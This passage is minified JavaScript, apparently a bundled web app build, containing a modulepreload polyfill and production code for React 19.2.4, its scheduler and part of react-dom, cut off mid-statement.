(function(){const X=document.createElement("link").relList;if(X&&X.supports&&X.supports("modulepreload"))return;for(const U of document.querySelectorAll('link[rel="modulepreload"]'))h(U);new MutationObserver(U=>{for(const J of U)if(J.type==="childList")for(const ce of J.addedNodes)ce.tagName==="LINK"&&ce.rel==="modulepreload"&&h(ce)}).observe(document,{childList:!0,subtree:!0});function K(U){const J={};return U.integrity&&(J.integrity=U.integrity),U.referrerPolicy&&(J.referrerPolicy=U.referrerPolicy),U.crossOrigin==="use-credentials"?J.credentials="include":U.crossOrigin==="anonymous"?J.credentials="omit":J.credentials="same-origin",J}function h(U){if(U.ep)return;U.ep=!0;const J=K(U);fetch(U.href,J)}})();var hs={exports:{}},An={};var zd;function py(){if(zd)return An;zd=1;var j=Symbol.for("react.transitional.element"),X=Symbol.for("react.fragment");function K(h,U,J){var ce=null;if(J!==void 0&&(ce=""+J),U.key!==void 0&&(ce=""+U.key),"key"in U){J={};for(var Te in U)Te!=="key"&&(J[Te]=U[Te])}else J=U;return U=J.ref,{$$typeof:j,type:h,key:ce,ref:U!==void 0?U:null,props:J}}return An.Fragment=X,An.jsx=K,An.jsxs=K,An}var Cd;function gy(){return Cd||(Cd=1,hs.exports=py()),hs.exports}var c=gy(),ms={exports:{}},F={};var Od;function vy(){if(Od)return F;Od=1;var j=Symbol.for("react.transitional.element"),X=Symbol.for("react.portal"),K=Symbol.for("react.fragment"),h=Symbol.for("react.strict_mode"),U=Symbol.for("react.profiler"),J=Symbol.for("react.consumer"),ce=Symbol.for("react.context"),Te=Symbol.for("react.forward_ref"),k=Symbol.for("react.suspense"),x=Symbol.for("react.memo"),ae=Symbol.for("react.lazy"),q=Symbol.for("react.activity"),he=Symbol.iterator;function ge(r){return r===null||typeof r!="object"?null:(r=he&&r[he]||r["@@iterator"],typeof r=="function"?r:null)}var ke={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},_e=Object.assign,Fe={};function me(r,A,z){this.props=r,this.context=A,this.refs=Fe,this.updater=z||ke}me.prototype.isReactComponent={},me.prototype.setState=function(r,A){if(typeof r!="object"&&typeof r!="function"&&r!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,r,A,"setState")},me.prototype.forceUpdate=function(r){this.updater.enqueueForceUpdate(this,r,"forceUpdate")};function Pe(){}Pe.prototype=me.prototype;function C(r,A,z){this.props=r,this.context=A,this.refs=Fe,this.updater=z||ke}var Ge=C.prototype=new Pe;Ge.constructor=C,_e(Ge,me.prototype),Ge.isPureReactComponent=!0;var B=Array.isArray;function w(){}var O={H:null,A:null,T:null,S:null},_=Object.prototype.hasOwnProperty;function Xe(r,A,z){var H=z.ref;return{$$typeof:j,type:r,key:A,ref:H!==void 0?H:null,props:z}}function ct(r,A){return Xe(r.type,A,r.props)}function $e(r){return typeof r=="object"&&r!==null&&r.$$typeof===j}function N(r){var A={"=":"=0",":":"=2"};return"$"+r.replace(/[=:]/g,function(z){return A[z]})}var L=/\/+/g;function Z(r,A){return typeof r=="object"&&r!==null&&r.key!=null?N(""+r.key):A.toString(36)}function D(r){switch(r.status){case"fulfilled":return r.value;case"rejected":throw r.reason;default:switch(typeof r.status=="string"?r.then(w,w):(r.status="pending",r.then(function(A){r.status==="pending"&&(r.status="fulfilled",r.value=A)},function(A){r.status==="pending"&&(r.status="rejected",r.reason=A)})),r.status){case"fulfilled":return r.value;case"rejected":throw r.reason}}throw r}function g(r,A,z,H,W){var Q=typeof r;(Q==="undefined"||Q==="boolean")&&(r=null);var I=!1;if(r===null)I=!0;else switch(Q){case"bigint":case"string":case"number":I=!0;break;case"object":switch(r.$$typeof){case j:case X:I=!0;break;case ae:return I=r._init,g(I(r._payload),A,z,H,W)}}if(I)return W=W(r),I=H===""?"."+Z(r,0):H,B(W)?(z="",I!=null&&(z=I.replace(L,"$&/")+"/"),g(W,A,z,"",function(Oa){return Oa})):W!=null&&($e(W)&&(W=ct(W,z+(W.key==null||r&&r.key===W.key?"":(""+W.key).replace(L,"$&/")+"/")+I)),A.push(W)),1;I=0;var Le=H===""?".":H+":";if(B(r))for(var Ne=0;Ne<r.length;Ne++)H=r[Ne],Q=Le+Z(H,Ne),I+=g(H,A,z,Q,W);else if(Ne=ge(r),typeof Ne=="function")for(r=Ne.call(r),Ne=0;!(H=r.next()).done;)H=H.value,Q=Le+Z(H,Ne++),I+=g(H,A,z,Q,W);else if(Q==="object"){if(typeof r.then=="function")return g(D(r),A,z,H,W);throw A=String(r),Error("Objects are not valid as a React child (found: "+(A==="[object Object]"?"object with keys {"+Object.keys(r).join(", ")+"}":A)+"). If you meant to render a collection of children, use an array instead.")}return I}function E(r,A,z){if(r==null)return r;var H=[],W=0;return g(r,H,"","",function(Q){return A.call(z,Q,W++)}),H}function Y(r){if(r._status===-1){var A=r._result;A=A(),A.then(function(z){(r._status===0||r._status===-1)&&(r._status=1,r._result=z)},function(z){(r._status===0||r._status===-1)&&(r._status=2,r._result=z)}),r._status===-1&&(r._status=0,r._result=A)}if(r._status===1)return r._result.default;throw r._result}var $=typeof reportError=="function"?reportError:function(r){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var A=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof r=="object"&&r!==null&&typeof r.message=="string"?String(r.message):String(r),error:r});if(!window.dispatchEvent(A))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",r);return}console.error(r)},ne={map:E,forEach:function(r,A,z){E(r,function(){A.apply(this,arguments)},z)},count:function(r){var A=0;return E(r,function(){A++}),A},toArray:function(r){return E(r,function(A){return A})||[]},only:function(r){if(!$e(r))throw Error("React.Children.only expected to receive a single React element child.");return r}};return F.Activity=q,F.Children=ne,F.Component=me,F.Fragment=K,F.Profiler=U,F.PureComponent=C,F.StrictMode=h,F.Suspense=k,F.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=O,F.__COMPILER_RUNTIME={__proto__:null,c:function(r){return O.H.useMemoCache(r)}},F.cache=function(r){return function(){return r.apply(null,arguments)}},F.cacheSignal=function(){return null},F.cloneElement=function(r,A,z){if(r==null)throw Error("The argument must be a React element, but you passed "+r+".");var H=_e({},r.props),W=r.key;if(A!=null)for(Q in A.key!==void 0&&(W=""+A.key),A)!_.call(A,Q)||Q==="key"||Q==="__self"||Q==="__source"||Q==="ref"&&A.ref===void 0||(H[Q]=A[Q]);var Q=arguments.length-2;if(Q===1)H.children=z;else if(1<Q){for(var I=Array(Q),Le=0;Le<Q;Le++)I[Le]=arguments[Le+2];H.children=I}return Xe(r.type,W,H)},F.createContext=function(r){return r={$$typeof:ce,_currentValue:r,_currentValue2:r,_threadCount:0,Provider:null,Consumer:null},r.Provider=r,r.Consumer={$$typeof:J,_context:r},r},F.createElement=function(r,A,z){var H,W={},Q=null;if(A!=null)for(H in A.key!==void 0&&(Q=""+A.key),A)_.call(A,H)&&H!=="key"&&H!=="__self"&&H!=="__source"&&(W[H]=A[H]);var I=arguments.length-2;if(I===1)W.children=z;else if(1<I){for(var Le=Array(I),Ne=0;Ne<I;Ne++)Le[Ne]=arguments[Ne+2];W.children=Le}if(r&&r.defaultProps)for(H in I=r.defaultProps,I)W[H]===void 0&&(W[H]=I[H]);return Xe(r,Q,W)},F.createRef=function(){return{current:null}},F.forwardRef=function(r){return{$$typeof:Te,render:r}},F.isValidElement=$e,F.lazy=function(r){return{$$typeof:ae,_payload:{_status:-1,_result:r},_init:Y}},F.memo=function(r,A){return{$$typeof:x,type:r,compare:A===void 0?null:A}},F.startTransition=function(r){var A=O.T,z={};O.T=z;try{var H=r(),W=O.S;W!==null&&W(z,H),typeof H=="object"&&H!==null&&typeof H.then=="function"&&H.then(w,$)}catch(Q){$(Q)}finally{A!==null&&z.types!==null&&(A.types=z.types),O.T=A}},F.unstable_useCacheRefresh=function(){return O.H.useCacheRefresh()},F.use=function(r){return O.H.use(r)},F.useActionState=function(r,A,z){return O.H.useActionState(r,A,z)},F.useCallback=function(r,A){return O.H.useCallback(r,A)},F.useContext=function(r){return O.H.useContext(r)},F.useDebugValue=function(){},F.useDeferredValue=function(r,A){return O.H.useDeferredValue(r,A)},F.useEffect=function(r,A){return O.H.useEffect(r,A)},F.useEffectEvent=function(r){return O.H.useEffectEvent(r)},F.useId=function(){return O.H.useId()},F.useImperativeHandle=function(r,A,z){return O.H.useImperativeHandle(r,A,z)},F.useInsertionEffect=function(r,A){return O.H.useInsertionEffect(r,A)},F.useLayoutEffect=function(r,A){return O.H.useLayoutEffect(r,A)},F.useMemo=function(r,A){return O.H.useMemo(r,A)},F.useOptimistic=function(r,A){return O.H.useOptimistic(r,A)},F.useReducer=function(r,A,z){return O.H.useReducer(r,A,z)},F.useRef=function(r){return O.H.useRef(r)},F.useState=function(r){return O.H.useState(r)},F.useSyncExternalStore=function(r,A,z){return O.H.useSyncExternalStore(r,A,z)},F.useTransition=function(){return O.H.useTransition()},F.version="19.2.4",F}var _d;function As(){return _d||(_d=1,ms.exports=vy()),ms.exports}var Ae=As(),ys={exports:{}},Nn={},ps={exports:{}},gs={};var Md;function Sy(){return Md||(Md=1,(function(j){function X(g,E){var Y=g.length;g.push(E);e:for(;0<Y;){var $=Y-1>>>1,ne=g[$];if(0<U(ne,E))g[$]=E,g[Y]=ne,Y=$;else break e}}function K(g){return g.length===0?null:g[0]}function h(g){if(g.length===0)return null;var E=g[0],Y=g.pop();if(Y!==E){g[0]=Y;e:for(var $=0,ne=g.length,r=ne>>>1;$<r;){var A=2*($+1)-1,z=g[A],H=A+1,W=g[H];if(0>U(z,Y))H<ne&&0>U(W,z)?(g[$]=W,g[H]=Y,$=H):(g[$]=z,g[A]=Y,$=A);else if(H<ne&&0>U(W,Y))g[$]=W,g[H]=Y,$=H;else break e}}return E}function U(g,E){var Y=g.sortIndex-E.sortIndex;return Y!==0?Y:g.id-E.id}if(j.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var J=performance;j.unstable_now=function(){return J.now()}}else{var ce=Date,Te=ce.now();j.unstable_now=function(){return ce.now()-Te}}var k=[],x=[],ae=1,q=null,he=3,ge=!1,ke=!1,_e=!1,Fe=!1,me=typeof setTimeout=="function"?setTimeout:null,Pe=typeof clearTimeout=="function"?clearTimeout:null,C=typeof setImmediate<"u"?setImmediate:null;function Ge(g){for(var E=K(x);E!==null;){if(E.callback===null)h(x);else if(E.startTime<=g)h(x),E.sortIndex=E.expirationTime,X(k,E);else break;E=K(x)}}function B(g){if(_e=!1,Ge(g),!ke)if(K(k)!==null)ke=!0,w||(w=!0,N());else{var E=K(x);E!==null&&D(B,E.startTime-g)}}var w=!1,O=-1,_=5,Xe=-1;function ct(){return Fe?!0:!(j.unstable_now()-Xe<_)}function $e(){if(Fe=!1,w){var g=j.unstable_now();Xe=g;var E=!0;try{e:{ke=!1,_e&&(_e=!1,Pe(O),O=-1),ge=!0;var Y=he;try{t:{for(Ge(g),q=K(k);q!==null&&!(q.expirationTime>g&&ct());){var $=q.callback;if(typeof $=="function"){q.callback=null,he=q.priorityLevel;var ne=$(q.expirationTime<=g);if(g=j.unstable_now(),typeof ne=="function"){q.callback=ne,Ge(g),E=!0;break t}q===K(k)&&h(k),Ge(g)}else h(k);q=K(k)}if(q!==null)E=!0;else{var r=K(x);r!==null&&D(B,r.startTime-g),E=!1}}break e}finally{q=null,he=Y,ge=!1}E=void 0}}finally{E?N():w=!1}}}var N;if(typeof C=="function")N=function(){C($e)};else if(typeof MessageChannel<"u"){var L=new MessageChannel,Z=L.port2;L.port1.onmessage=$e,N=function(){Z.postMessage(null)}}else N=function(){me($e,0)};function D(g,E){O=me(function(){g(j.unstable_now())},E)}j.unstable_IdlePriority=5,j.unstable_ImmediatePriority=1,j.unstable_LowPriority=4,j.unstable_NormalPriority=3,j.unstable_Profiling=null,j.unstable_UserBlockingPriority=2,j.unstable_cancelCallback=function(g){g.callback=null},j.unstable_forceFrameRate=function(g){0>g||125<g?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):_=0<g?Math.floor(1e3/g):5},j.unstable_getCurrentPriorityLevel=function(){return he},j.unstable_next=function(g){switch(he){case 1:case 2:case 3:var E=3;break;default:E=he}var Y=he;he=E;try{return g()}finally{he=Y}},j.unstable_requestPaint=function(){Fe=!0},j.unstable_runWithPriority=function(g,E){switch(g){case 1:case 2:case 3:case 4:case 5:break;default:g=3}var Y=he;he=g;try{return E()}finally{he=Y}},j.unstable_scheduleCallback=function(g,E,Y){var $=j.unstable_now();switch(typeof Y=="object"&&Y!==null?(Y=Y.delay,Y=typeof Y=="number"&&0<Y?$+Y:$):Y=$,g){case 1:var ne=-1;break;case 2:ne=250;break;case 5:ne=1073741823;break;case 4:ne=1e4;break;default:ne=5e3}return ne=Y+ne,g={id:ae++,callback:E,priorityLevel:g,startTime:Y,expirationTime:ne,sortIndex:-1},Y>$?(g.sortIndex=Y,X(x,g),K(k)===null&&g===K(x)&&(_e?(Pe(O),O=-1):_e=!0,D(B,Y-$))):(g.sortIndex=ne,X(k,g),ke||ge||(ke=!0,w||(w=!0,N()))),g},j.unstable_shouldYield=ct,j.unstable_wrapCallback=function(g){var E=he;return function(){var Y=he;he=E;try{return g.apply(this,arguments)}finally{he=Y}}}})(gs)),gs}var Dd;function by(){return Dd||(Dd=1,ps.exports=Sy()),ps.exports}var vs={exports:{}},We={};var Hd;function xy(){if(Hd)return We;Hd=1;var j=As();function X(k){var x="https://react.dev/errors/"+k;if(1<arguments.length){x+="?args[]="+encodeURIComponent(arguments[1]);for(var ae=2;ae<arguments.length;ae++)x+="&args[]="+encodeURIComponent(arguments[ae])}return"Minified React error #"+k+"; visit "+x+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function K(){}var h={d:{f:K,r:function(){throw Error(X(522))},D:K,C:K,L:K,m:K,X:K,S:K,M:K},p:0,findDOMNode:null},U=Symbol.for("react.portal");function J(k,x,ae){var q=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:U,key:q==null?null:""+q,children:k,containerInfo:x,implementation:ae}}var ce=j.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function Te(k,x){if(k==="font")return"";if(typeof x=="string")return x==="use-credentials"?x:""}return We.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=h,We.createPortal=function(k,x){var ae=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!x||x.nodeType!==1&&x.nodeType!==9&&x.nodeType!==11)throw Error(X(299));return J(k,x,null,ae)},We.flushSync=function(k){var x=ce.T,ae=h.p;try{if(ce.T=null,h.p=2,k)return k()}finally{ce.T=x,h.p=ae,h.d.f()}},We.preconnect=function(k,x){typeof k=="string"&&(x?(x=x.crossOrigin,x=typeof x=="string"?x==="use-credentials"?x:"":void 0):x=null,h.d.C(k,x))},We.prefetchDNS=function(k){typeof k=="string"&&h.d.D(k)},We.preinit=function(k,x){if(typeof k=="string"&&x&&typeof x.as=="string"){var ae=x.as,q=Te(ae,x.crossOrigin),he=typeof x.integrity=="string"?x.integrity:void 0,ge=typeof x.fetchPriority=="string"?x.fetchPriority:void 0;ae==="style"?h.d.S(k,typeof x.precedence=="string"?x.precedence:void 0,{crossOrigin:q,integrity:he,fetchPriority:ge}):ae==="script"&&h.d.X(k,{crossOrigin:q,integrity:he,fetchPriority:ge,nonce:typeof x.nonce=="string"?x.nonce:void 0})}},We.preinitModule=function(k,x){if(typeof k=="string")if(typeof x=="object"&&x!==null){if(x.as==null||x.as==="script"){var ae=Te(x.as,x.crossOrigin);h.d.M(k,{crossOrigin:ae,integrity:typeof x.integrity=="string"?x.integrity:void 0,nonce:typeof x.nonce=="string"?x.nonce:void 0})}}else x==null&&h.d.M(k)},We.preload=function(k,x){if(typeof k=="string"&&typeof x=="object"&&x!==null&&typeof x.as=="string"){var ae=x.as,q=Te(ae,x.crossOrigin);h.d.L(k,ae,{crossOrigin:q,integrity:typeof x.integrity=="string"?x.integrity:void 0,nonce:typeof x.nonce=="string"?x.nonce:void 0,type:typeof x.type=="string"?x.type:void 0,fetchPriority:typeof x.fetchPriority=="string"?x.fetchPriority:void 0,referrerPolicy:typeof x.referrerPolicy=="string"?x.referrerPolicy:void 0,imageSrcSet:typeof x.imageSrcSet=="string"?x.imageSrcSet:void 0,imageSizes:typeof x.imageSizes=="string"?x.imageSizes:void 0,media:typeof x.media=="string"?x.media:void 0})}},We.preloadModule=function(k,x){if(typeof k=="string")if(x){var ae=Te(x.as,x.crossOrigin);h.d.m(k,{as:typeof x.as=="string"&&x.as!=="script"?x.as:void 0,crossOrigin:ae,integrity:typeof x.integrity=="string"?x.integrity:void 0})}else h.d.m(k)},We.requestFormReset=function(k){h.d.r(k)},We.unstable_batchedUpdates=function(k,x){return k(x)},We.useFormState=function(k,x,ae){return ce.H.useFormState(k,x,ae)},We.useFormStatus=function(){return ce.H.useHostTransitionStatus()},We.version="19.2.4",We}var wd;function Ty(){if(wd)return vs.exports;wd=1;function j(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(j)}catch(X){console.error(X)}}return j(),vs.exports=xy(),vs.exports}var Ud;function Ay(){if(Ud)return Nn;Ud=1;var j=by(),X=As(),K=Ty();function h(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var l=2;l<arguments.length;l++)t+="&args[]="+encodeURIComponent(arguments[l])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function U(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function J(e){var t=e,l=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(l=t.return),e=t.return;while(e)}return t.tag===3?l:null}function ce(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Te(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function k(e){if(J(e)!==e)throw Error(h(188))}function x(e){var t=e.alternate;if(!t){if(t=J(e),t===null)throw Error(h(188));return t!==e?null:e}for(var l=e,a=t;;){var n=l.return;if(n===null)break;var i=n.alternate;if(i===null){if(a=n.return,a!==null){l=a;continue}break}if(n.child===i.child){for(i=n.child;i;){if(i===l)return k(n),e;if(i===a)return k(n),t;i=i.sibling}throw Error(h(188))}if(l.return!==a.return)l=n,a=i;else{for(var u=!1,s=n.child;s;){if(s===l){u=!0,l=n,a=i;break}if(s===a){u=!0,a=n,l=i;break}s=s.sibling}if(!u){for(s=i.child;s;){if(s===l){u=!0,l=i,a=n;break}if(s===a){u=!0,a=i,l=n;break}s=s.sibling}if(!u)throw Error(h(189))}}if(l.alternate!==a)throw Error(h(190))}if(l.tag!==3)throw Error(h(188));return l.stateNode.current===l?e:t}function ae(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=ae(e),t!==null)return t;e=e.sibling}return null}var q=Object.assign,he=Symbol.for("react.element"),ge=Symbol.for("react.transitional.element"),ke=Symbol.for("react.portal"),_e=Symbol.for("react.fragment"),Fe=Symbol.for("react.strict_mode"),me=Symbol.for("react.profiler"),Pe=Symbol.for("react.consumer"),C=Symbol.for("react.context"),Ge=Symbol.for("react.forward_ref"),B=Symbol.for("react.suspense"),w=Symbol.for("react.suspense_list"),O=Symbol.for("react.memo"),_=Symbol.for("react.lazy"),Xe=Symbol.for("react.activity"),ct=Symbol.for("react.memo_cache_sentinel"),$e=Symbol.iterator;function N(e){return e===null||typeof e!="object"?null:(e=$e&&e[$e]||e["@@iterator"],typeof e=="function"?e:null)}var L=Symbol.for("react.client.reference");function Z(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===L?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case _e:return"Fragment";case me:return"Profiler";case Fe:return"StrictMode";case B:return"Suspense";case w:return"SuspenseList";case Xe:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case ke:return"Portal";case C:return e.displayName||"Context";case Pe:return(e._context.displayName||"Context")+".Consumer";case Ge:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case O:return t=e.displayName||null,t!==null?t:Z(e.type)||"Memo";case _:t=e._payload,e=e._init;try{return Z(e(t))}catch{}}return null}var D=Array.isArray,g=X.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,E=K.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,Y={pending:!1,data:null,method:null,action:null},$=[],ne=-1;function r(e){return{current:e}}function A(e){0>ne||(e.current=$[ne],$[ne]=null,ne--)}function z(e,t){ne++,$[ne]=e.current,e.current=t}var H=r(null),W=r(null),Q=r(null),I=r(null);function Le(e,t){switch(z(Q,t),z(W,e),z(H,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?Fr(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=Fr(t),e=$r(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}A(H),z(H,e)}function Ne(){A(H),A(W),A(Q)}function Oa(e){e.memoizedState!==null&&z(I,e);var t=H.current,l=$r(t,e.type);t!==l&&(z(W,e),z(H,l))}function zn(e){W.current===e&&(A(H),A(W)),I.current===e&&(A(I),Sn._currentValue=Y)}var Wi,Ns;function El(e){if(Wi===void 0)try{throw Error()}catch(l){var t=l.stack.trim().match(/\n( *(at )?)/);Wi=t&&t[1]||"",Ns=-1<l.stack.indexOf(`
    at`)?" (<anonymous>)":-1<l.stack.indexOf("@")?"@unknown:0:0":""}return`
`+Wi+e+Ns}var Fi=!1;function $i(e,t){if(!e||Fi)return"";Fi=!0;var l=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var a={DetermineComponentFrameRoot:function(){try{if(t){var T=function(){throw Error()};if(Object.defineProperty(T.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(T,[])}catch(v){var p=v}Reflect.construct(e,[],T)}else{try{T.call()}catch(v){p=v}e.call(T.prototype)}}else{try{throw Error()}catch(v){p=v}(T=e())&&typeof T.catch=="function"&&T.catch(function(){})}}catch(v){if(v&&p&&typeof v.stack=="string")return[v.stack,p.stack]}return[null,null]}};a.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var n=Object.getOwnPropertyDescriptor(a.DetermineComponentFrameRoot,"name");n&&n.configurable&&Object.defineProperty(a.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var i=a.DetermineComponentFrameRoot(),u=i[0],s=i[1];if(u&&s){var o=u.split(`
`),y=s.split(`
`);for(n=a=0;a<o.length&&!o[a].includes("DetermineComponentFrameRoot");)a++;for(;n<y.length&&!y[n].includes("DetermineComponentFrameRoot");)n++;if(a===o.length||n===y.length)for(a=o.length-1,n=y.length-1;1<=a&&0<=n&&o[a]!==y[n];)n--;for(;1<=a&&0<=n;a--,n--)if(o[a]!==y[n]){if(a!==1||n!==1)do if(a--,n--,0>n||o[a]!==y[n]){var S=`
`+o[a].replace(" at new "," at ");return e.displayName&&S.includes("<anonymous>")&&(S=S.replace("<anonymous>",e.displayName)),S}while(1<=a&&0<=n);break}}}finally{Fi=!1,Error.prepareStackTrace=l}return(l=e?e.displayName||e.name:"")?El(l):""}function Kd(e,t){switch(e.tag){case 26:case 27:case 5:return El(e.type);case 16:return El("Lazy");case 13:return e.child!==t&&t!==null?El("Suspense Fallback"):El("Suspense");case 19:return El("SuspenseList");case 0:case 15:return $i(e.type,!1);case 11:return $i(e.type.render,!1);case 1:return $i(e.type,!0);case 31:return El("Activity");default:return""}}function js(e){try{var t="",l=null;do t+=Kd(e,l),l=e,e=e.return;while(e);return t}catch(a){return`
Error generating stack: `+a.message+`
`+a.stack}}var Ii=Object.prototype.hasOwnProperty,Pi=j.unstable_scheduleCallback,eu=j.unstable_cancelCallback,Jd=j.unstable_shouldYield,Wd=j.unstable_requestPaint,st=j.unstable_now,Fd=j.unstable_getCurrentPriorityLevel,Es=j.unstable_ImmediatePriority,zs=j.unstable_UserBlockingPriority,Cn=j.unstable_NormalPriority,$d=j.unstable_LowPriority,Cs=j.unstable_IdlePriority,Id=j.log,Pd=j.unstable_setDisableYieldValue,_a=null,ot=null;function el(e){if(typeof Id=="function"&&Pd(e),ot&&typeof ot.setStrictMode=="function")try{ot.setStrictMode(_a,e)}catch{}}var ft=Math.clz32?Math.clz32:lh,eh=Math.log,th=Math.LN2;function lh(e){return e>>>=0,e===0?32:31-(eh(e)/th|0)|0}var On=256,_n=262144,Mn=4194304;function zl(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function Dn(e,t,l){var a=e.pendingLanes;if(a===0)return 0;var n=0,i=e.suspendedLanes,u=e.pingedLanes;e=e.warmLanes;var s=a&134217727;return s!==0?(a=s&~i,a!==0?n=zl(a):(u&=s,u!==0?n=zl(u):l||(l=s&~e,l!==0&&(n=zl(l))))):(s=a&~i,s!==0?n=zl(s):u!==0?n=zl(u):l||(l=a&~e,l!==0&&(n=zl(l)))),n===0?0:t!==0&&t!==n&&(t&i)===0&&(i=n&-n,l=t&-t,i>=l||i===32&&(l&4194048)!==0)?t:n}function Ma(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function ah(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Os(){var e=Mn;return Mn<<=1,(Mn&62914560)===0&&(Mn=4194304),e}function tu(e){for(var t=[],l=0;31>l;l++)t.push(e);return t}function Da(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function nh(e,t,l,a,n,i){var u=e.pendingLanes;e.pendingLanes=l,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=l,e.entangledLanes&=l,e.errorRecoveryDisabledLanes&=l,e.shellSuspendCounter=0;var s=e.entanglements,o=e.expirationTimes,y=e.hiddenUpdates;for(l=u&~l;0<l;){var S=31-ft(l),T=1<<S;s[S]=0,o[S]=-1;var p=y[S];if(p!==null)for(y[S]=null,S=0;S<p.length;S++){var v=p[S];v!==null&&(v.lane&=-536870913)}l&=~T}a!==0&&_s(e,a,0),i!==0&&n===0&&e.tag!==0&&(e.suspendedLanes|=i&~(u&~t))}function _s(e,t,l){e.pendingLanes|=t,e.suspendedLanes&=~t;var a=31-ft(t);e.entangledLanes|=t,e.entanglements[a]=e.entanglements[a]|1073741824|l&261930}function Ms(e,t){var l=e.entangledLanes|=t;for(e=e.entanglements;l;){var a=31-ft(l),n=1<<a;n&t|e[a]&t&&(e[a]|=t),l&=~n}}function Ds(e,t){var l=t&-t;return l=(l&42)!==0?1:lu(l),(l&(e.suspendedLanes|t))!==0?0:l}function lu(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function au(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function Hs(){var e=E.p;return e!==0?e:(e=window.event,e===void 0?32:bd(e.type))}function ws(e,t){var l=E.p;try{return E.p=e,t()}finally{E.p=l}}var tl=Math.random().toString(36).slice(2),Qe="__reactFiber$"+tl,et="__reactProps$"+tl,Vl="__reactContainer$"+tl,nu="__reactEvents$"+tl,ih="__reactListeners$"+tl,uh="__reactHandles$"+tl,Us="__reactResources$"+tl,Ha="__reactMarker$"+tl;function iu(e){delete e[Qe],delete e[et],delete e[nu],delete e[ih],delete e[uh]}function Zl(e){var t=e[Qe];if(t)return t;for(var l=e.parentNode;l;){if(t=l[Vl]||l[Qe]){if(l=t.alternate,t.child!==null||l!==null&&l.child!==null)for(e=nd(e);e!==null;){if(l=e[Qe])return l;e=nd(e)}return t}e=l,l=e.parentNode}return null}function Kl(e){if(e=e[Qe]||e[Vl]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return e}return null}function wa(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(h(33))}function Jl(e){var t=e[Us];return t||(t=e[Us]={hoistableStyles:new Map,hoistableScripts:new Map}),t}function Ye(e){e[Ha]=!0}var Rs=new 